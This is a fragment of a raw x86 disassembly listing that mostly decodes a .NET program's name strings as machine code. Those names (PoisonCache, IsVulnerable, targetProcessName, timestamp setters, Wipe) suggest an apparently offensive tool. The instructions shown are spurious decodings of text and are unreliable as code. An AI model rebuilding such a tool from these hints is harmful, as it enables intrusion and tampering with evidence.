  407b88:	61                   	popa
  407b89:	67 65 00 52 61       	add    %dl,%gs:0x61(%bp,%si)
  407b8e:	6e                   	outsb  %ds:(%esi),(%dx)
  407b8f:	67 65 00 50 6f       	add    %dl,%gs:0x6f(%bx,%si)
  407b94:	69 73 6f 6e 43 61 63 	imul   $0x6361436e,0x6f(%ebx),%esi
  407b9b:	68 65 00 45 6e       	push   $0x6e450065
  407ba0:	75 6d                	jne    0x407c0f
  407ba2:	65 72 61             	gs jb  0x407c06
  407ba5:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  407ba9:	49                   	dec    %ecx
  407baa:	73 56                	jae    0x407c02
  407bac:	75 6c                	jne    0x407c1a
  407bae:	6e                   	outsb  %ds:(%esi),(%dx)
  407baf:	65 72 61             	gs jb  0x407c13
  407bb2:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  407bb6:	49                   	dec    %ecx
  407bb7:	44                   	inc    %esp
  407bb8:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  407bbf:	6c                   	insb   (%dx),%es:(%edi)
  407bc0:	65 00 57 61          	add    %dl,%gs:0x61(%edi)
  407bc4:	69 74 46 6f 72 49 6e 	imul   $0x706e4972,0x6f(%esi,%eax,2),%esi
  407bcb:	70 
  407bcc:	75 74                	jne    0x407c42
  407bce:	49                   	dec    %ecx
  407bcf:	64 6c                	fs insb (%dx),%es:(%edi)
  407bd1:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  407bd5:	6e                   	outsb  %ds:(%esi),(%dx)
  407bd6:	74 69                	je     0x407c41
  407bd8:	6d                   	insl   (%dx),%es:(%edi)
  407bd9:	65 46                	gs inc %esi
  407bdb:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  407be2:	64 6c                	fs insb (%dx),%es:(%edi)
  407be4:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407be8:	74 4d                	je     0x407c37
  407bea:	6f                   	outsl  %ds:(%esi),(%dx)
  407beb:	64 75 6c             	fs jne 0x407c5a
  407bee:	65 48                	gs dec %eax
  407bf0:	61                   	popa
  407bf1:	6e                   	outsb  %ds:(%esi),(%dx)
  407bf2:	64 6c                	fs insb (%dx),%es:(%edi)
  407bf4:	65 00 43 6c          	add    %al,%gs:0x6c(%ebx)
  407bf8:	6f                   	outsl  %ds:(%esi),(%dx)
  407bf9:	73 65                	jae    0x407c60
  407bfb:	48                   	dec    %eax
  407bfc:	61                   	popa
  407bfd:	6e                   	outsb  %ds:(%esi),(%dx)
  407bfe:	64 6c                	fs insb (%dx),%es:(%edi)
  407c00:	65 00 62 49          	add    %ah,%gs:0x49(%edx)
  407c04:	6e                   	outsb  %ds:(%esi),(%dx)
  407c05:	68 65 72 69 74       	push   $0x74697265
  407c0a:	48                   	dec    %eax
  407c0b:	61                   	popa
  407c0c:	6e                   	outsb  %ds:(%esi),(%dx)
  407c0d:	64 6c                	fs insb (%dx),%es:(%edi)
  407c0f:	65 00 64 65 73       	add    %ah,%gs:0x73(%ebp,%eiz,2)
  407c14:	74 46                	je     0x407c5c
  407c16:	69 6c 65 00 49 73 49 	imul   $0x6e497349,0x0(%ebp,%eiz,2),%ebp
  407c1d:	6e 
  407c1e:	52                   	push   %edx
  407c1f:	6f                   	outsl  %ds:(%esi),(%dx)
  407c20:	6c                   	insb   (%dx),%es:(%edi)
  407c21:	65 00 57 69          	add    %dl,%gs:0x69(%edi)
  407c25:	6e                   	outsb  %ds:(%esi),(%dx)
  407c26:	64 6f                	outsl  %fs:(%esi),(%dx)
  407c28:	77 73                	ja     0x407c9d
  407c2a:	42                   	inc    %edx
  407c2b:	75 69                	jne    0x407c96
  407c2d:	6c                   	insb   (%dx),%es:(%edi)
  407c2e:	74 49                	je     0x407c79
  407c30:	6e                   	outsb  %ds:(%esi),(%dx)
  407c31:	52                   	push   %edx
  407c32:	6f                   	outsl  %ds:(%esi),(%dx)
  407c33:	6c                   	insb   (%dx),%es:(%edi)
  407c34:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  407c38:	6e                   	outsb  %ds:(%esi),(%dx)
  407c39:	73 6f                	jae    0x407caa
  407c3b:	6c                   	insb   (%dx),%es:(%edi)
  407c3c:	65 00 68 4d          	add    %ch,%gs:0x4d(%eax)
  407c40:	6f                   	outsl  %ds:(%esi),(%dx)
  407c41:	64 75 6c             	fs jne 0x407cb0
  407c44:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407c48:	74 5f                	je     0x407ca9
  407c4a:	4d                   	dec    %ebp
  407c4b:	61                   	popa
  407c4c:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  407c53:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  407c57:	6f                   	outsl  %ds:(%esi),(%dx)
  407c58:	63 65 73             	arpl   %esp,0x73(%ebp)
  407c5b:	73 4d                	jae    0x407caa
  407c5d:	6f                   	outsl  %ds:(%esi),(%dx)
  407c5e:	64 75 6c             	fs jne 0x407ccd
  407c61:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  407c65:	74 5f                	je     0x407cc6
  407c67:	57                   	push   %edi
  407c68:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  407c6f:	79 6c                	jns    0x407cdd
  407c71:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  407c75:	6f                   	outsl  %ds:(%esi),(%dx)
  407c76:	63 65 73             	arpl   %esp,0x73(%ebp)
  407c79:	73 57                	jae    0x407cd2
  407c7b:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  407c82:	79 6c                	jns    0x407cf0
  407c84:	65 00 70 72          	add    %dh,%gs:0x72(%eax)
  407c88:	6f                   	outsl  %ds:(%esi),(%dx)
  407c89:	63 4e 61             	arpl   %ecx,0x61(%esi)
  407c8c:	6d                   	insl   (%dx),%es:(%edi)
  407c8d:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407c91:	74 5f                	je     0x407cf2
  407c93:	46                   	inc    %esi
  407c94:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407c9b:	00 
  407c9c:	73 65                	jae    0x407d03
  407c9e:	74 5f                	je     0x407cff
  407ca0:	46                   	inc    %esi
  407ca1:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407ca8:	00 
  407ca9:	47                   	inc    %edi
  407caa:	65 6e                	outsb  %gs:(%esi),(%dx)
  407cac:	65 72 61             	gs jb  0x407d10
  407caf:	74 65                	je     0x407d16
  407cb1:	52                   	push   %edx
  407cb2:	61                   	popa
  407cb3:	6e                   	outsb  %ds:(%esi),(%dx)
  407cb4:	64 6f                	outsl  %fs:(%esi),(%dx)
  407cb6:	6d                   	insl   (%dx),%es:(%edi)
  407cb7:	46                   	inc    %esi
  407cb8:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407cbf:	00 
  407cc0:	47                   	inc    %edi
  407cc1:	65 74 52             	gs je  0x407d16
  407cc4:	61                   	popa
  407cc5:	6e                   	outsb  %ds:(%esi),(%dx)
  407cc6:	64 6f                	outsl  %fs:(%esi),(%dx)
  407cc8:	6d                   	insl   (%dx),%es:(%edi)
  407cc9:	46                   	inc    %esi
  407cca:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407cd1:	00 
  407cd2:	6c                   	insb   (%dx),%es:(%edi)
  407cd3:	70 46                	jo     0x407d1b
  407cd5:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407cdc:	00 
  407cdd:	6c                   	insb   (%dx),%es:(%edi)
  407cde:	70 4d                	jo     0x407d2d
  407ce0:	6f                   	outsl  %ds:(%esi),(%dx)
  407ce1:	64 75 6c             	fs jne 0x407d50
  407ce4:	65 4e                	gs dec %esi
  407ce6:	61                   	popa
  407ce7:	6d                   	insl   (%dx),%es:(%edi)
  407ce8:	65 00 64 62 67       	add    %ah,%gs:0x67(%edx,%eiz,2)
  407ced:	4e                   	dec    %esi
  407cee:	61                   	popa
  407cef:	6d                   	insl   (%dx),%es:(%edi)
  407cf0:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407cf4:	74 5f                	je     0x407d55
  407cf6:	46                   	inc    %esi
  407cf7:	75 6c                	jne    0x407d65
  407cf9:	6c                   	insb   (%dx),%es:(%edi)
  407cfa:	4e                   	dec    %esi
  407cfb:	61                   	popa
  407cfc:	6d                   	insl   (%dx),%es:(%edi)
  407cfd:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407d01:	74 5f                	je     0x407d62
  407d03:	50                   	push   %eax
  407d04:	72 6f                	jb     0x407d75
  407d06:	63 65 73             	arpl   %esp,0x73(%ebp)
  407d09:	73 4e                	jae    0x407d59
  407d0b:	61                   	popa
  407d0c:	6d                   	insl   (%dx),%es:(%edi)
  407d0d:	65 00 74 61 72       	add    %dh,%gs:0x72(%ecx,%eiz,2)
  407d12:	67 65 74 50          	addr16 gs je 0x407d66
  407d16:	72 6f                	jb     0x407d87
  407d18:	63 65 73             	arpl   %esp,0x73(%ebp)
  407d1b:	73 4e                	jae    0x407d6b
  407d1d:	61                   	popa
  407d1e:	6d                   	insl   (%dx),%es:(%edi)
  407d1f:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407d23:	74 48                	je     0x407d6d
  407d25:	6f                   	outsl  %ds:(%esi),(%dx)
  407d26:	73 74                	jae    0x407d9c
  407d28:	4e                   	dec    %esi
  407d29:	61                   	popa
  407d2a:	6d                   	insl   (%dx),%es:(%edi)
  407d2b:	65 00 72 65          	add    %dh,%gs:0x65(%edx)
  407d2f:	67 69 73 74 72 79 4b 	imul   $0x654b7972,0x74(%bp,%di),%esi
  407d36:	65 
  407d37:	79 4e                	jns    0x407d87
  407d39:	61                   	popa
  407d3a:	6d                   	insl   (%dx),%es:(%edi)
  407d3b:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407d3f:	74 44                	je     0x407d85
  407d41:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  407d48:	79 4e                	jns    0x407d98
  407d4a:	61                   	popa
  407d4b:	6d                   	insl   (%dx),%es:(%edi)
  407d4c:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  407d50:	74 5f                	je     0x407db1
  407d52:	55                   	push   %ebp
  407d53:	73 65                	jae    0x407dba
  407d55:	72 6e                	jb     0x407dc5
  407d57:	61                   	popa
  407d58:	6d                   	insl   (%dx),%es:(%edi)
  407d59:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  407d5e:	65 54                	gs push %esp
  407d60:	69 6d 65 00 47 65 74 	imul   $0x74654700,0x65(%ebp),%ebp
  407d67:	4c                   	dec    %esp
  407d68:	61                   	popa
  407d69:	73 74                	jae    0x407ddf
  407d6b:	57                   	push   %edi
  407d6c:	72 69                	jb     0x407dd7
  407d6e:	74 65                	je     0x407dd5
  407d70:	54                   	push   %esp
  407d71:	69 6d 65 00 53 65 74 	imul   $0x74655300,0x65(%ebp),%ebp
  407d78:	4c                   	dec    %esp
  407d79:	61                   	popa
  407d7a:	73 74                	jae    0x407df0
  407d7c:	57                   	push   %edi
  407d7d:	72 69                	jb     0x407de8
  407d7f:	74 65                	je     0x407de6
  407d81:	54                   	push   %esp
  407d82:	69 6d 65 00 47 65 74 	imul   $0x74654700,0x65(%ebp),%ebp
  407d89:	43                   	inc    %ebx
  407d8a:	72 65                	jb     0x407df1
  407d8c:	61                   	popa
  407d8d:	74 69                	je     0x407df8
  407d8f:	6f                   	outsl  %ds:(%esi),(%dx)
  407d90:	6e                   	outsb  %ds:(%esi),(%dx)
  407d91:	54                   	push   %esp
  407d92:	69 6d 65 00 53 65 74 	imul   $0x74655300,0x65(%ebp),%ebp
  407d99:	43                   	inc    %ebx
  407d9a:	72 65                	jb     0x407e01
  407d9c:	61                   	popa
  407d9d:	74 69                	je     0x407e08
  407d9f:	6f                   	outsl  %ds:(%esi),(%dx)
  407da0:	6e                   	outsb  %ds:(%esi),(%dx)
  407da1:	54                   	push   %esp
  407da2:	69 6d 65 00 47 65 74 	imul   $0x74654700,0x65(%ebp),%ebp
  407da9:	4c                   	dec    %esp
  407daa:	61                   	popa
  407dab:	73 74                	jae    0x407e21
  407dad:	41                   	inc    %ecx
  407dae:	63 63 65             	arpl   %esp,0x65(%ebx)
  407db1:	73 73                	jae    0x407e26
  407db3:	54                   	push   %esp
  407db4:	69 6d 65 00 53 65 74 	imul   $0x74655300,0x65(%ebp),%ebp
  407dbb:	4c                   	dec    %esp
  407dbc:	61                   	popa
  407dbd:	73 74                	jae    0x407e33
  407dbf:	41                   	inc    %ecx
  407dc0:	63 63 65             	arpl   %esp,0x65(%ebx)
  407dc3:	73 73                	jae    0x407e38
  407dc5:	54                   	push   %esp
  407dc6:	69 6d 65 00 52 65 61 	imul   $0x61655200,0x65(%ebp),%ebp
  407dcd:	64 4c                	fs dec %esp
  407dcf:	69 6e 65 00 57 72 69 	imul   $0x69725700,0x65(%esi),%ebp
  407dd6:	74 65                	je     0x407e3d
  407dd8:	4c                   	dec    %esp
  407dd9:	69 6e 65 00 43 6f 6d 	imul   $0x6d6f4300,0x65(%esi),%ebp
  407de0:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  407de3:	65 00 49 41          	add    %cl,%gs:0x41(%ecx)
  407de7:	73 79                	jae    0x407e62
  407de9:	6e                   	outsb  %ds:(%esi),(%dx)
  407dea:	63 53 74             	arpl   %edx,0x74(%ebx)
  407ded:	61                   	popa
  407dee:	74 65                	je     0x407e55
  407df0:	4d                   	dec    %ebp
  407df1:	61                   	popa
  407df2:	63 68 69             	arpl   %ebp,0x69(%eax)
  407df5:	6e                   	outsb  %ds:(%esi),(%dx)
  407df6:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
  407dfa:	74 53                	je     0x407e4f
  407dfc:	74 61                	je     0x407e5f
  407dfe:	74 65                	je     0x407e65
  407e00:	4d                   	dec    %ebp
  407e01:	61                   	popa
  407e02:	63 68 69             	arpl   %ebp,0x69(%eax)
  407e05:	6e                   	outsb  %ds:(%esi),(%dx)
  407e06:	65 00 73 74          	add    %dh,%gs:0x74(%ebx)
  407e0a:	61                   	popa
  407e0b:	74 65                	je     0x407e72
  407e0d:	4d                   	dec    %ebp
  407e0e:	61                   	popa
  407e0f:	63 68 69             	arpl   %ebp,0x69(%eax)
  407e12:	6e                   	outsb  %ds:(%esi),(%dx)
  407e13:	65 00 4c 6f 63       	add    %cl,%gs:0x63(%edi,%ebp,2)
  407e18:	61                   	popa
  407e19:	6c                   	insb   (%dx),%es:(%edi)
  407e1a:	4d                   	dec    %ebp
  407e1b:	61                   	popa
  407e1c:	63 68 69             	arpl   %ebp,0x69(%eax)
  407e1f:	6e                   	outsb  %ds:(%esi),(%dx)
  407e20:	65 00 57 69          	add    %dl,%gs:0x69(%edi)
  407e24:	70 65                	jo     0x407e8b
  407e26:	00 4d 61             	add    %cl,0x61(%ebp)
  407e29:	6e                   	outsb  %ds:(%esi),(%dx)
  407e2a:	61                   	popa
  407e2b:	67 65 6d             	gs insl (%dx),%es:(%di)
  407e2e:	65 6e                	outsb  %gs:(%esi),(%dx)
  407e30:	74 53                	je     0x407e85
  407e32:	63 6f 70             	arpl   %ebp,0x70(%edi)
  407e35:	65 00 56 61          	add    %dl,%gs:0x61(%esi)
  407e39:	6c                   	insb   (%dx),%es:(%edi)
  407e3a:	75 65                	jne    0x407ea1
  407e3c:	54                   	push   %esp
  407e3d:	79 70                	jns    0x407eaf
  407e3f:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407e43:	74 5f                	je     0x407ea4
  407e45:	44                   	inc    %esp
  407e46:	72 69                	jb     0x407eb1
  407e48:	76 65                	jbe    0x407eaf
  407e4a:	54                   	push   %esp
  407e4b:	79 70                	jns    0x407ebd
  407e4d:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  407e51:	6f                   	outsl  %ds:(%esi),(%dx)
  407e52:	74 6f                	je     0x407ec3
  407e54:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  407e57:	54                   	push   %esp
  407e58:	79 70                	jns    0x407eca
  407e5a:	65 00 66 6c          	add    %ah,%gs:0x6c(%esi)
  407e5e:	41                   	inc    %ecx
  407e5f:	6c                   	insb   (%dx),%es:(%edi)
  407e60:	6c                   	insb   (%dx),%es:(%edi)
  407e61:	6f                   	outsl  %ds:(%esi),(%dx)
  407e62:	63 61 74             	arpl   %esp,0x74(%ecx)
  407e65:	69 6f 6e 54 79 70 65 	imul   $0x65707954,0x6e(%edi),%ebp
  407e6c:	00 53 6f             	add    %dl,0x6f(%ebx)
  407e6f:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  407e72:	74 54                	je     0x407ec8
  407e74:	79 70                	jns    0x407ee6
  407e76:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  407e7a:	74 5f                	je     0x407edb
  407e7c:	43                   	inc    %ebx
  407e7d:	6f                   	outsl  %ds:(%esi),(%dx)
  407e7e:	6e                   	outsb  %ds:(%esi),(%dx)
  407e7f:	74 65                	je     0x407ee6
  407e81:	6e                   	outsb  %ds:(%esi),(%dx)
  407e82:	74 54                	je     0x407ed8
  407e84:	79 70                	jns    0x407ef6
  407e86:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
  407e8a:	74 50                	je     0x407edc
  407e8c:	72 6f                	jb     0x407efd
  407e8e:	63 65 73             	arpl   %esp,0x73(%ebp)
  407e91:	73 44                	jae    0x407ed7
  407e93:	50                   	push   %eax
  407e94:	49                   	dec    %ecx
  407e95:	41                   	inc    %ecx
  407e96:	77 61                	ja     0x407ef9
  407e98:	72 65                	jb     0x407eff
  407e9a:	00 53 79             	add    %dl,0x79(%ebx)
  407e9d:	73 74                	jae    0x407f13
  407e9f:	65 6d                	gs insl (%dx),%es:(%edi)
  407ea1:	2e 43                	cs inc %ebx
  407ea3:	6f                   	outsl  %ds:(%esi),(%dx)
  407ea4:	72 65                	jb     0x407f0b
  407ea6:	00 43 61             	add    %al,0x61(%ebx)
  407ea9:	70 74                	jo     0x407f1f
  407eab:	75 72                	jne    0x407f1f
  407ead:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  407eb1:	6c                   	insb   (%dx),%es:(%edi)
  407eb2:	65 61                	gs popa
  407eb4:	73 65                	jae    0x407f1b
  407eb6:	00 67 65             	add    %ah,0x65(%edi)
  407eb9:	74 5f                	je     0x407f1a
  407ebb:	52                   	push   %edx
  407ebc:	65 73 70             	gs jae 0x407f2f
  407ebf:	6f                   	outsl  %ds:(%esi),(%dx)
  407ec0:	6e                   	outsb  %ds:(%esi),(%dx)
  407ec1:	73 65                	jae    0x407f28
  407ec3:	00 48 74             	add    %cl,0x74(%eax)
  407ec6:	74 70                	je     0x407f38
  407ec8:	4c                   	dec    %esp
  407ec9:	69 73 74 65 6e 65 72 	imul   $0x72656e65,0x74(%ebx),%esi
  407ed0:	52                   	push   %edx
  407ed1:	65 73 70             	gs jae 0x407f44
  407ed4:	6f                   	outsl  %ds:(%esi),(%dx)
  407ed5:	6e                   	outsb  %ds:(%esi),(%dx)
  407ed6:	73 65                	jae    0x407f3d
  407ed8:	00 43 6c             	add    %al,0x6c(%ebx)
  407edb:	6f                   	outsl  %ds:(%esi),(%dx)
  407edc:	73 65                	jae    0x407f43
  407ede:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  407ee2:	70 6f                	jo     0x407f53
  407ee4:	73 65                	jae    0x407f4b
  407ee6:	00 43 72             	add    %al,0x72(%ebx)
  407ee9:	65 61                	gs popa
  407eeb:	74 65                	je     0x407f52
  407eed:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  407ef0:	31 5f 5f             	xor    %ebx,0x5f(%edi)
  407ef3:	73 74                	jae    0x407f69
  407ef5:	61                   	popa
  407ef6:	74 65                	je     0x407f5d
  407ef8:	00 44 65 6c          	add    %al,0x6c(%ebp,%eiz,2)
  407efc:	65 74 65             	gs je  0x407f64
  407eff:	00 53 61             	add    %dl,0x61(%ebx)
  407f02:	66 65 43             	gs inc %bx
  407f05:	6f                   	outsl  %ds:(%esi),(%dx)
  407f06:	6e                   	outsb  %ds:(%esi),(%dx)
  407f07:	73 6f                	jae    0x407f78
  407f09:	6c                   	insb   (%dx),%es:(%edi)
  407f0a:	65 57                	gs push %edi
  407f0c:	72 69                	jb     0x407f77
  407f0e:	74 65                	je     0x407f75
  407f10:	00 53 54             	add    %dl,0x54(%ebx)
  407f13:	41                   	inc    %ecx
  407f14:	54                   	push   %esp
  407f15:	68 72 65 61 64       	push   $0x64616572
  407f1a:	41                   	inc    %ecx
  407f1b:	74 74                	je     0x407f91
  407f1d:	72 69                	jb     0x407f88
  407f1f:	62 75 74             	bound  %esi,0x74(%ebp)
  407f22:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  407f26:	6d                   	insl   (%dx),%es:(%edi)
  407f27:	70 69                	jo     0x407f92
  407f29:	6c                   	insb   (%dx),%es:(%edi)
  407f2a:	65 72 47             	gs jb  0x407f74
  407f2d:	65 6e                	outsb  %gs:(%esi),(%dx)
  407f2f:	65 72 61             	gs jb  0x407f93
  407f32:	74 65                	je     0x407f99
  407f34:	64 41                	fs inc %ecx
  407f36:	74 74                	je     0x407fac
  407f38:	72 69                	jb     0x407fa3
  407f3a:	62 75 74             	bound  %esi,0x74(%ebp)
  407f3d:	65 00 47 75          	add    %al,%gs:0x75(%edi)
  407f41:	69 64 41 74 74 72 69 	imul   $0x62697274,0x74(%ecx,%eax,2),%esp
  407f48:	62 
  407f49:	75 74                	jne    0x407fbf
  407f4b:	65 00 55 6e          	add    %dl,%gs:0x6e(%ebp)
  407f4f:	76 65                	jbe    0x407fb6
  407f51:	72 69                	jb     0x407fbc
  407f53:	66 69 61 62 6c 65    	imul   $0x656c,0x62(%ecx),%sp
  407f59:	43                   	inc    %ebx
  407f5a:	6f                   	outsl  %ds:(%esi),(%dx)
  407f5b:	64 65 41             	fs gs inc %ecx
  407f5e:	74 74                	je     0x407fd4
  407f60:	72 69                	jb     0x407fcb
  407f62:	62 75 74             	bound  %esi,0x74(%ebp)
  407f65:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  407f6a:	75 67                	jne    0x407fd3
  407f6c:	67 61                	addr16 popa
  407f6e:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  407f72:	74 74                	je     0x407fe8
  407f74:	72 69                	jb     0x407fdf
  407f76:	62 75 74             	bound  %esi,0x74(%ebp)
  407f79:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  407f7d:	6d                   	insl   (%dx),%es:(%edi)
  407f7e:	56                   	push   %esi
  407f7f:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  407f86:	74 74                	je     0x407ffc
  407f88:	72 69                	jb     0x407ff3
  407f8a:	62 75 74             	bound  %esi,0x74(%ebp)
  407f8d:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  407f91:	73 65                	jae    0x407ff8
  407f93:	6d                   	insl   (%dx),%es:(%edi)
  407f94:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  407f98:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  407f9f:	72 
  407fa0:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  407fa7:	73 79                	jae    0x408022
  407fa9:	6e                   	outsb  %ds:(%esi),(%dx)
  407faa:	63 53 74             	arpl   %edx,0x74(%ebx)
  407fad:	61                   	popa
  407fae:	74 65                	je     0x408015
  407fb0:	4d                   	dec    %ebp
  407fb1:	61                   	popa
  407fb2:	63 68 69             	arpl   %ebp,0x69(%eax)
  407fb5:	6e                   	outsb  %ds:(%esi),(%dx)
  407fb6:	65 41                	gs inc %ecx
  407fb8:	74 74                	je     0x40802e
  407fba:	72 69                	jb     0x408025
  407fbc:	62 75 74             	bound  %esi,0x74(%ebp)
  407fbf:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  407fc3:	73 65                	jae    0x40802a
  407fc5:	6d                   	insl   (%dx),%es:(%edi)
  407fc6:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  407fca:	72 61                	jb     0x40802d
  407fcc:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  407fcf:	61                   	popa
  407fd0:	72 6b                	jb     0x40803d
  407fd2:	41                   	inc    %ecx
  407fd3:	74 74                	je     0x408049
  407fd5:	72 69                	jb     0x408040
  407fd7:	62 75 74             	bound  %esi,0x74(%ebp)
  407fda:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  407fdf:	67 65 74 46          	addr16 gs je 0x408029
  407fe3:	72 61                	jb     0x408046
  407fe5:	6d                   	insl   (%dx),%es:(%edi)
  407fe6:	65 77 6f             	gs ja  0x408058
  407fe9:	72 6b                	jb     0x408056
  407feb:	41                   	inc    %ecx
  407fec:	74 74                	je     0x408062
  407fee:	72 69                	jb     0x408059
  407ff0:	62 75 74             	bound  %esi,0x74(%ebp)
  407ff3:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  407ff8:	75 67                	jne    0x408061
  407ffa:	67 65 72 48          	addr16 gs jb 0x408046
  407ffe:	69 64 64 65 6e 41 74 	imul   $0x7474416e,0x65(%esp,%eiz,2),%esp
  408005:	74 
  408006:	72 69                	jb     0x408071
  408008:	62 75 74             	bound  %esi,0x74(%ebp)
  40800b:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40800f:	73 65                	jae    0x408076
  408011:	6d                   	insl   (%dx),%es:(%edi)
  408012:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  408016:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  40801d:	69 
  40801e:	6f                   	outsl  %ds:(%esi),(%dx)
  40801f:	6e                   	outsb  %ds:(%esi),(%dx)
  408020:	41                   	inc    %ecx
  408021:	74 74                	je     0x408097
  408023:	72 69                	jb     0x40808e
  408025:	62 75 74             	bound  %esi,0x74(%ebp)
  408028:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
  40802c:	63 75 72             	arpl   %esi,0x72(%ebp)
  40802f:	69 74 79 50 65 72 6d 	imul   $0x696d7265,0x50(%ecx,%edi,2),%esi
  408036:	69 
  408037:	73 73                	jae    0x4080ac
  408039:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  408040:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  408047:	73 73                	jae    0x4080bc
  408049:	65 6d                	gs insl (%dx),%es:(%edi)
  40804b:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  40804f:	6f                   	outsl  %ds:(%esi),(%dx)
  408050:	6e                   	outsb  %ds:(%esi),(%dx)
  408051:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  408057:	74 69                	je     0x4080c2
  408059:	6f                   	outsl  %ds:(%esi),(%dx)
  40805a:	6e                   	outsb  %ds:(%esi),(%dx)
  40805b:	41                   	inc    %ecx
  40805c:	74 74                	je     0x4080d2
  40805e:	72 69                	jb     0x4080c9
  408060:	62 75 74             	bound  %esi,0x74(%ebp)
  408063:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408067:	73 65                	jae    0x4080ce
  408069:	6d                   	insl   (%dx),%es:(%edi)
  40806a:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  40806e:	65 73 63             	gs jae 0x4080d4
  408071:	72 69                	jb     0x4080dc
  408073:	70 74                	jo     0x4080e9
  408075:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  40807c:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
  408083:	6f                   	outsl  %ds:(%esi),(%dx)
  408084:	6d                   	insl   (%dx),%es:(%edi)
  408085:	70 69                	jo     0x4080f0
  408087:	6c                   	insb   (%dx),%es:(%edi)
  408088:	61                   	popa
  408089:	74 69                	je     0x4080f4
  40808b:	6f                   	outsl  %ds:(%esi),(%dx)
  40808c:	6e                   	outsb  %ds:(%esi),(%dx)
  40808d:	52                   	push   %edx
  40808e:	65 6c                	gs insb (%dx),%es:(%edi)
  408090:	61                   	popa
  408091:	78 61                	js     0x4080f4
  408093:	74 69                	je     0x4080fe
  408095:	6f                   	outsl  %ds:(%esi),(%dx)
  408096:	6e                   	outsb  %ds:(%esi),(%dx)
  408097:	73 41                	jae    0x4080da
  408099:	74 74                	je     0x40810f
  40809b:	72 69                	jb     0x408106
  40809d:	62 75 74             	bound  %esi,0x74(%ebp)
  4080a0:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4080a4:	73 65                	jae    0x40810b
  4080a6:	6d                   	insl   (%dx),%es:(%edi)
  4080a7:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  4080ab:	72 6f                	jb     0x40811c
  4080ad:	64 75 63             	fs jne 0x408113
  4080b0:	74 41                	je     0x4080f3
  4080b2:	74 74                	je     0x408128
  4080b4:	72 69                	jb     0x40811f
  4080b6:	62 75 74             	bound  %esi,0x74(%ebp)
  4080b9:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4080bd:	73 65                	jae    0x408124
  4080bf:	6d                   	insl   (%dx),%es:(%edi)
  4080c0:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
